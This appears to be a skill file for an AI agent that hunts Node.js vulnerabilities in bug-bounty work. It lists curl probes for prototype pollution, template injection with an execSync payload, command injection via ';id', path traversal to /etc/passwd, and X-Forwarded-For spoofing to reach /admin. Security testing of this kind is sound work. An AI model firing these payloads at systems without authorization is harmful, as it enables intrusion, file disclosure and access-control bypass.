---
name: hunt-nodejs
description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
sources: hackerone_public, snyk_research, portswigger_research
report_count: 24
---

# HUNT-NODEJS — Node.js Specific Vulnerabilities

## Crown Jewel Targets
- **Prototype Pollution → RCE** — `__proto__` injection via lodash.merge/Object.assign → child_process.exec
- **Express trust proxy** — `app.set('trust proxy', true)` → spoof X-Forwarded-For
- **EJS/Pug SSTI** — `{{= process.mainModule.require('child_process').execSync('id') }}`
- **`child_process` injection** — shell command injection
- **`require()` path traversal** — load arbitrary file as JS

## Phase 1 — Fingerprint
```bash
curl -sI https://$TARGET/ | grep -i "x-powered-by\|nodejs\|express"
curl -s "https://$TARGET/package.json" | head -5
curl -s "https://$TARGET/nonexistent" | grep -i "node\|express\|Cannot"
```

## Phase 2 — Prototype Pollution Detection
```bash
# JSON body injection
curl -s -X POST https://$TARGET/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# URL-based PP (qs library)
curl -s "https://$TARGET/api/search?__proto__[isAdmin]=true"

# Confirm via response header injection
curl -s "https://$TARGET/api/search?__proto__[res]=1&__proto__[setHeader]=1"
```

## Phase 3 — Template Engine SSTI
```bash
# EJS — detect
curl -s "https://$TARGET/api/render?name=<%=7*7%>"

# Pug — detect
curl -s "https://$TARGET/api/render?name=#{7*7}"

# Handlebars — detect
curl -s "https://$TARGET/api/render?name={{7*7}}"
```

## Phase 4 — child_process & Path Traversal
```bash
# Command injection
curl -s "https://$TARGET/api/ping?host=127.0.0.1;id"

# Path traversal
curl -s --path-as-is "https://$TARGET/api/files/../../../etc/passwd"
```

## Phase 5 — Express Trust Proxy
```bash
# Test if X-Forwarded-For is trusted
curl -s -H "X-Forwarded-For: 127.0.0.1" "https://$TARGET/admin"
```

## Related Skills
- **hunt-ssrf** — combine with PP to reach internal services
- **hunt-rce** — full exploit after PP/sink confirmation
- **triage-validation** — 7-Question Gate
